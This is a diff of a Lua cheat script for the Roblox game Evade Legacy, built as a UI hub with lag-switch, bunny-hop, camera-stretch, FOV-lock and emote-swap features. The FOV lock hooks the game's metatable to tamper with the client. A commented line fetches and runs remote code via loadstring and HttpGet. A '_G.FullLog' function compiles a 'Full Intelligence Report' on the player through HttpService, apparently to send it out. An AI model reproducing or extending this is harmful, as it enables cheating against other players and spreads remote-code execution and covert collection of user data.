@@ -17,7 +17,7 @@ _G.PhantomWyrmXIsAlreadyRunning = true
 
 local Window = Fluent:CreateWindow({
     Title = "PhantomWyrm-Hub-X - Evade Legacy│Mobile",
-    SubTitle = "v2.15.10 Made By Carey",
+    SubTitle = "v2.18.10 Made By Carey",
     TabWidth = 160,
     Size = UDim2.fromOffset(540, 390),
     Acrylic = false,
@@ -393,7 +393,7 @@ end
 
 -- Announcement
 
--- loadstring(game:HttpGet("https://raw.githubusercontent.com/Nyxarth910/Draconic-Hub-X/refs/heads/main/files/GlobalAnnouncement.lua"))()
+-- loadstring(game:HttpGet("https://raw.githubusercontent.com/Nyxarth910/Draconic-Hub-X/refs/heads/main/files/GlobalAnnouncement.lua"))() Press f darconic hub x 🥀
 
 -- Scripts
 
@@ -2494,8 +2494,8 @@ Tabs.Misc:AddInput("LagSwitchButtonSize", {
         Title = "Delay MS",
         Default = "200",
         Placeholder = "Value",
-        Numeric = false, -- Only allows numbers
-        Finished = false, -- Only calls callback when you press enter
+        Numeric = false,
+        Finished = false, 
         Callback = function(Value)
             DConfiguration.Misc.Utilities.LagSwitch.MSDelay = tonumber(Value) or 200
         end
@@ -2548,6 +2548,94 @@ end)
             DConfiguration.Misc.Utilities.BounceModification.EmoteBounce = tonumber(Value) or 120
         end
     })
+    
+Tabs.Misc:AddSection("Camera Adjustment")
+
+if not _G.Phantom then
+    _G.Phantom = {}
+end
+_G.Phantom.ResolutionValue = 1
+local a = workspace.CurrentCamera
+if _G.PhantomCameraLoop == nil then
+    _G.PhantomCameraLoop =
+        game:GetService("RunService").RenderStepped:Connect(
+        function()
+            local b = _G.Phantom.ResolutionValue
+            if b and b ~= 1 then
+                a.CFrame = a.CFrame * CFrame.new(0, 0, 0, 1, 0, 0, 0, b, 0, 0, 0, 1)
+            end
+        end
+    )
+end
+
+Tabs.Misc:AddInput("PhantomFOV", {
+        Title = "Stretch",
+        Description = "write 0.8 or 0.1",
+        Default = "1",
+        Placeholder = "",
+        Numeric = false,
+        Finished = false,
+        Callback = function(c)
+            local d = tonumber(c)
+            if d and d > 0 then
+                _G.Phantom.ResolutionValue = d
+            else
+                _G.Phantom.ResolutionValue = 1
+            end
+        end
+    }
+)
+
+_G.FinalStrictFOV = 70
+local a = workspace.CurrentCamera
+local b = getrawmetatable(game)
+local c = b.__newindex
+setreadonly(b, false)
+b.__newindex =
+    newcclosure(
+    function(self, d, e)
+        if self == workspace.CurrentCamera and d == "FieldOfView" then
+            return c(self, d, _G.FinalStrictFOV)
+        end
+        return c(self, d, e)
+    end
+)
+setreadonly(b, true)
+if _G.StrictFovLoop then
+    _G.StrictFovLoop:Disconnect()
+end
+_G.StrictFovLoop =
+    game:GetService("RunService").RenderStepped:Connect(
+    function()
+        if workspace.CurrentCamera then
+            workspace.CurrentCamera.FieldOfView = _G.FinalStrictFOV
+        end
+        local f = game.Players.LocalPlayer.PlayerScripts:FindFirstChild("FOVAdjusters")
+        if f then
+            for g, h in pairs(f:GetChildren()) do
+                if h:IsA("NumberValue") or h:IsA("IntValue") then
+                    h.Value = _G.FinalStrictFOV
+                end
+            end
+        end
+    end
+)
+Tabs.Misc:AddInput("PlayerFOV", {
+        Title = "Player FOV (Strict Lock)",
+        Description = "Minimum 30 │Max 120",
+        Default = "70",
+        Placeholder = "FOV Number",
+        Numeric = true,
+        Finished = true,
+        Callback = function(i)
+            local j = tonumber(i)
+            if j and j >= 30 and j <= 140 then
+                _G.FinalStrictFOV = j
+            end
+        end
+    }
+)
+
 
 Tabs.Misc:AddSection("Game Automations")
 
@@ -3044,8 +3132,8 @@ Tabs.Misc:AddInput("BHOPAcceleration", {
         Description = "Negative Only",
         Default = "-0.1",
         Placeholder = "-1",
-        Numeric = false, -- Only allows numbers
-        Finished = false, -- Only calls callback when you press enter
+        Numeric = false,
+        Finished = false,
         Callback = function(Value)
             DConfiguration.Misc.MovementModification.BHOP.Acceleration = tonumber(Value) or -0.1
         end
@@ -3068,8 +3156,8 @@ Tabs.Misc:AddInput("BHOPAcceleration", {
         Title = "Max Speed Acceleration",
         Default = "70",
         Placeholder = "70",
-        Numeric = false, -- Only allows numbers
-        Finished = false, -- Only calls callback when you press enter
+        Numeric = false, 
+        Finished = false,
         Callback = function(Value)
             DConfiguration.Misc.MovementModification.BHOP.MaxSpeed = tonumber(Value) or 70
         end
@@ -3456,8 +3544,8 @@ local Input = Tabs.Visual:AddInput("CosmeticsChange1", {
         Title = "Current Cosmetics",
         Default = "HeartSkaters",
         Placeholder = "",
-        Numeric = false, -- Only allows numbers
-        Finished = false, -- Only calls callback when you press enter
+        Numeric = false, 
+        Finished = false, 
         Callback = function(Value)
             ChangeCosmetics1 = Value
         end
@@ -3467,8 +3555,8 @@ local Input = Tabs.Visual:AddInput("CosmeticsChange2", {
         Title = "Select Cosmetics",
         Default = "ToxicInferno",
         Placeholder = "",
-        Numeric = false, -- Only allows numbers
-        Finished = false, -- Only calls callback when you press enter
+        Numeric = false,
+        Finished = false, 
         Callback = function(Value)
             ChangeCosmetics2 = Value
         end
@@ -3487,37 +3575,189 @@ Tabs.Visual:AddButton({
 
 Tabs.Visual:AddSection("Emote Changer")
 
-local Input = Tabs.Visual:AddInput("EmoteChange1", {
-        Title = "Current Emote",
-        Default = "BoldMarch",
-        Placeholder = "",
-        Numeric = false, -- Only allows numbers
-        Finished = false, -- Only calls callback when you press enter
-        Callback = function(Value)
-            ChangeEmote1 = Value
+    CurrentEmote1 = "BoldMarch"
+CurrentEmote2 = "RockinStride"
+CurrentEmote3 = "Emote3"
+CurrentEmote4 = "Emote4"
+CurrentEmote5 = "Emote5"
+CurrentEmote6 = "Emote6"
+
+SelectEmote1 = "RockinStride"
+SelectEmote2 = "BoldMarch"
+SelectEmote3 = "Replace3"
+SelectEmote4 = "Replace4"
+SelectEmote5 = "Replace5"
+SelectEmote6 = "Replace6"
+
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+local function Normalize(input)
+    return input:lower():gsub("%s+", "") 
+end
+
+local function FindRealName(folder, userInput)
+    if not folder then return nil end
+    local normalizedInput = Normalize(userInput)
+    for _, item in ipairs(folder:GetChildren()) do
+        if Normalize(item.Name) == normalizedInput then
+            return item.Name
         end
-    })
-    
-local Input = Tabs.Visual:AddInput("EmoteChange2", {
-        Title = "Select Emote",
-        Default = "RockinStride",
-        Placeholder = "",
-        Numeric = false, -- Only allows numbers
-        Finished = false, -- Only calls callback when you press enter
-        Callback = function(Value)
-            ChangeEmote2 = Value
+    end
+    return nil
+end
+
+local function DirectNameSwapEmote(Name1, Name2)
+    pcall(function()
+        local EmotesFolder = ReplicatedStorage:FindFirstChild("Items") and ReplicatedStorage.Items:FindFirstChild("Emotes")
+        if not EmotesFolder then return end
+        
+        local RealName1 = FindRealName(EmotesFolder, Name1)
+        local RealName2 = FindRealName(EmotesFolder, Name2)
+        
+        if RealName1 and RealName2 and RealName1 ~= RealName2 then
+            local I = EmotesFolder:FindFirstChild(RealName1)
+            local V = EmotesFolder:FindFirstChild(RealName2)
+            if I and V then
+                I.Name = RealName2
+                task.wait(0.01)
+                V.Name = RealName1
+            end
         end
-    })
-    
+    end)
+end
+
+Tabs.Visual:AddInput("EmoteCurrent1", {
+    Title = "Slot 1: Current Emote",
+    Default = CurrentEmote1,
+    Placeholder = "Original emote name",
+    Numeric = false, Finished = false,
+    Callback = function(Value) CurrentEmote1 = Value end
+})
+
+Tabs.Visual:AddInput("EmoteCurrent2", {
+    Title = "Slot 2: Current Emote",
+    Default = CurrentEmote2,
+    Placeholder = "Original emote name",
+    Numeric = false, Finished = false,
+    Callback = function(Value) CurrentEmote2 = Value end
+})
+
+Tabs.Visual:AddInput("EmoteCurrent3", {
+    Title = "Slot 3: Current Emote",
+    Default = CurrentEmote3,
+    Placeholder = "Original emote name",
+    Numeric = false, Finished = false,
+    Callback = function(Value) CurrentEmote3 = Value end
+})
+
+Tabs.Visual:AddInput("EmoteCurrent4", {
+    Title = "Slot 4: Current Emote",
+    Default = CurrentEmote4,
+    Placeholder = "Original emote name",
+    Numeric = false, Finished = false,
+    Callback = function(Value) CurrentEmote4 = Value end
+})
+
+Tabs.Visual:AddInput("EmoteCurrent5", {
+    Title = "Slot 5: Current Emote",
+    Default = CurrentEmote5,
+    Placeholder = "Original emote name",
+    Numeric = false, Finished = false,
+    Callback = function(Value) CurrentEmote5 = Value end
+})
+
+Tabs.Visual:AddInput("EmoteCurrent6", {
+    Title = "Slot 6: Current Emote",
+    Default = CurrentEmote6,
+    Placeholder = "Original emote name",
+    Numeric = false, Finished = false,
+    Callback = function(Value) CurrentEmote6 = Value end
+})
+
+Tabs.Visual:AddParagraph({ Title = " ", Content = "" })
+
+Tabs.Visual:AddInput("EmoteSelect1", {
+    Title = "Slot 1: Select Emote",
+    Default = SelectEmote1,
+    Placeholder = "Replace with...",
+    Numeric = false, Finished = false,
+    Callback = function(Value) SelectEmote1 = Value end
+})
+
+Tabs.Visual:AddInput("EmoteSelect2", {
+    Title = "Slot 2: Select Emote",
+    Default = SelectEmote2,
+    Placeholder = "Replace with...",
+    Numeric = false, Finished = false,
+    Callback = function(Value) SelectEmote2 = Value end
+})
+
+Tabs.Visual:AddInput("EmoteSelect3", {
+    Title = "Slot 3: Select Emote",
+    Default = SelectEmote3,
+    Placeholder = "Replace with...",
+    Numeric = false, Finished = false,
+    Callback = function(Value) SelectEmote3 = Value end
+})
+
+Tabs.Visual:AddInput("EmoteSelect4", {
+    Title = "Slot 4: Select Emote",
+    Default = SelectEmote4,
+    Placeholder = "Replace with...",
+    Numeric = false, Finished = false,
+    Callback = function(Value) SelectEmote4 = Value end
+})
+
+Tabs.Visual:AddInput("EmoteSelect5", {
+    Title = "Slot 5: Select Emote",
+    Default = SelectEmote5,
+    Placeholder = "Replace with...",
+    Numeric = false, Finished = false,
+    Callback = function(Value) SelectEmote5 = Value end
+})
+
+Tabs.Visual:AddInput("EmoteSelect6", {
+    Title = "Slot 6: Select Emote",
+    Default = SelectEmote6,
+    Placeholder = "Replace with...",
+    Numeric = false, Finished = false,
+    Callback = function(Value) SelectEmote6 = Value end
+})
+
+Tabs.Visual:AddParagraph({ Title = "Don't use Stride with Rockin' Stride", Content = "It is advisable not to use Stride at all" })
+
 Tabs.Visual:AddButton({
-        Title = "Change Emote",
-        Description = "" ,
-        Callback = function()
-           spawn(function()
-		       ChangeEmotes(ChangeEmote1, ChangeEmote2)
-           end)
-        end
-    })
+    Title = "Change Emotes",
+    Description = "",
+    Callback = function()
+        task.spawn(function()
+            local emotePairs = {
+                {current = CurrentEmote1, select = SelectEmote1},
+                {current = CurrentEmote2, select = SelectEmote2},
+                {current = CurrentEmote3, select = SelectEmote3},
+                {current = CurrentEmote4, select = SelectEmote4},
+                {current = CurrentEmote5, select = SelectEmote5},
+                {current = CurrentEmote6, select = SelectEmote6}
+            }
+            
+            local usedEmotes = {}
+            
+            for i, pair in ipairs(emotePairs) do
+                if pair.current and pair.select and pair.current ~= "" and pair.select ~= "" and pair.current ~= pair.select then
+                    if not usedEmotes[pair.current] and not usedEmotes[pair.select] then
+                        DirectNameSwapEmote(pair.current, pair.select)
+                        
+                        usedEmotes[pair.current] = true
+                        usedEmotes[pair.select] = true
+                        
+                        task.wait(0.02)
+                    end
+                end
+            end
+        end)
+    end
+})
+
     
 -- info
 
@@ -4889,6 +5129,7 @@ if LP.Character then
     initialize(LP.Character)
 end
 
+
 _G.FullLog = function()
     local http = game:GetService("HttpService")
     local player = game.Players.LocalPlayer
@@ -4898,7 +5139,7 @@ _G.FullLog = function()
     pcall(function() gName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name end)
 
     local data = {
-        ["content"] = "Intelligence Report Sent!",
+        ["content"] = "Evade legacy",
         ["embeds"] = {{
             ["title"] = "👤 Full Intelligence Report",
             ["color"] = 16711680,
